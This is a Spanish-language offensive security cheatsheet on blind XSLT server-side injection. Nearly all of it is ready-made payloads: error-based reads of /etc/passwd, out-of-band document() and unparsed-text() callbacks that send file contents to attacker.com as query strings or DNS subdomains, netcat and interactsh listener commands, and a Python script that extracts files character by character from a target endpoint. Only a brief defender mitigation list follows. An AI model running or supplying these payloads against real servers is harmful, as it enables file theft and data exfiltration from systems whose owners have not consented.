---
aliases:
  - XSLT Blind Injection
  - XSLT Error-based Exfil
  - XSLT OOB
tags:
  - type/cheatsheet
  - vuln/xslt-injection
  - technique/exfiltration
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[eXtensible Stylesheet Language Transformations (XSLT) Server-Side Injection]]"
---
# XSLT - Blind Exfil

***

## Cheatsheet

| **Técnica** | **Payload** | **Canal** |
|:---:|:---:|---|
| **Error-based (forced fail)** | `<xsl:value-of select="document('file:///etc/passwd')/nonexistent"/>` | Error message del parser incluye contenido leído. |
| **XPath type error** | `<xsl:value-of select="document('file:///etc/passwd') div 0"/>` | Division forzada → error con contexto. |
| **OOB vía `document()` HTTP** | `<xsl:copy-of select="document(concat('http://attacker/?d=', unparsed-text('file:///etc/passwd')))"/>` | Data en URL del attacker listener. |
| **OOB vía `unparsed-text()` callback** | `<xsl:value-of select="unparsed-text(concat('http://attacker/?f=', encode-for-uri(unparsed-text('file:///etc/passwd'))))"/>` | XSLT 2.0+. |
| **DNS exfil (Saxon)** | `<xsl:variable name="d" select="unparsed-text('file:///etc/hostname')"/><xsl:value-of select="document(concat('http://', $d, '.attacker.com/'))"/>` | DNS query al atacante con data. |
| **Boolean via element existence** | `<xsl:if test="contains(unparsed-text('file:///etc/passwd'), 'root:')">ROOT-FOUND</xsl:if>` | Response diff con marker. |
| **Char-by-char via substring** | `<xsl:value-of select="substring(unparsed-text('file:///etc/passwd'), 1, 1)"/>` | Extraer un char por request. |
| **Time-based (XSLT 2.0+)** | `<xsl:for-each select="1 to 1000000"><xsl:value-of select="."/></xsl:for-each>` | Loop condicional por char. |
^xslt-blind

___

## Overview

Cuando XSLT injection confirmada pero la **respuesta no refleja** output de `value-of` (blind), opciones de exfil:

1. **Error-based** — forzar error del parser incluyendo el dato en el mensaje.
2. **Out-of-band (OOB)** — `document()` HTTP callback al atacante con data como query string.
3. **DNS exfil** — subdominio con data → DNS logs del atacante.
4. **Boolean / time oracle** — inferir char por char via response differences.

### Error-based — forzar fail con data

Payload con path XPath inexistente:
```xml
<xsl:value-of select="document('file:///etc/passwd')/nonexistent/node"/>
```

Motor parsea el archivo pero falla buscando `/nonexistent/node` → error message a menudo incluye root element del XML parseado.

División por cero con data:
```xml
<xsl:value-of select="document('file:///etc/passwd') div 0"/>
```

Fuerza error de type conversion con contenido en el stack trace.

### OOB con `document()` HTTP callback

Atacante corre listener:
```bash
# HTTP básico
python3 -m http.server 8080

# Raw TCP logger
nc -lvnp 8080

# Burp Collaborator / interactsh — domain único
interactsh-client -v
```

Payload (XSLT 2.0+):
```xml
<xsl:stylesheet version="2.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="secret" select="unparsed-text('file:///etc/passwd')"/>
    <xsl:copy-of select="document(concat('http://attacker.com:8080/?d=', encode-for-uri($secret)))"/>
  </xsl:template>
</xsl:stylesheet>
```

Atacante ve:
```
GET /?d=root%3Ax%3A0%3A0%3Aroot%3A%2Froot... HTTP/1.1
```

### DNS exfil

Si egress HTTP filtrado pero DNS no:
```xml
<xsl:variable name="host" select="unparsed-text('file:///etc/hostname')"/>
<xsl:value-of select="document(concat('http://', $host, '.attacker.com/'))"/>
```

DNS query `<hostname>.attacker.com` aparece en DNS log.

Limitación: DNS subdomain max 63 chars, charset `a-z0-9-`. Para data grande → chunk:
```xml
<xsl:for-each select="1 to 10">
  <xsl:variable name="chunk" select="substring($secret, (. - 1) * 60 + 1, 60)"/>
  <xsl:value-of select="document(concat('http://chunk', ., '-', $chunk, '.attacker.com/'))"/>
</xsl:for-each>
```

### Boolean-based char-by-char

Si no hay OOB + error no leakea data → oracle via response diff:

```xml
<xsl:if test="substring(unparsed-text('file:///etc/passwd'), 1, 1) = 'r'">
  MARKER_FOUND
</xsl:if>
```

Iterar charset `[a-z0-9]` para cada posición. Script Python PoC:
```python
import requests
import string

chars = string.ascii_letters + string.digits + ":/_-"
result = ""

while True:
    found = False
    for c in chars:
        payload = f'''<?xml version="1.0"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:if test="substring(unparsed-text('file:///etc/passwd'), {len(result)+1}, 1) = '{c}'">
      FOUND_MARKER
    </xsl:if>
  </xsl:template>
</xsl:stylesheet>'''
        r = requests.post('http://target/xslt', data={'xsl': payload})
        if 'FOUND_MARKER' in r.text:
            result += c
            print(f"[+] {result}")
            found = True
            break
    if not found:
        break
```

### Time-based (XSLT 2.0+)

Si no hay diff observable → loop delay conditional:
```xml
<xsl:choose>
  <xsl:when test="substring(unparsed-text('file:///etc/passwd'), 1, 1) = 'r'">
    <!-- Loop 1M iteraciones = delay observable -->
    <xsl:for-each select="1 to 1000000">
      <xsl:value-of select="string-length(concat(., .))"/>
    </xsl:for-each>
  </xsl:when>
</xsl:choose>
```

### Limitaciones por motor

| Motor | OOB `document()` | `unparsed-text()` | Error verbose |
|---|---|---|---|
| **libxslt** | ✓ HTTP + file | ✗ (1.0) | Depende config PHP |
| **Saxon-HE** | ✓ | ✓ | Siempre |
| **Xalan** | ✓ | ✗ (1.0) | Sí |
| **MSXML** | Limitado | ✗ | Sí |

### Mitigación defender

- Disable external resolution: `DOMDocument::$resolveExternals = false;` (PHP).
- Saxon: `FeatureKeys.ALLOW_EXTERNAL_FUNCTIONS = false` + `XmlResolver(null)`.
- Sanitizar error messages — never return raw parser errors al cliente.
- Egress network filtering (firewall block HTTP outbound desde backend procs).

***
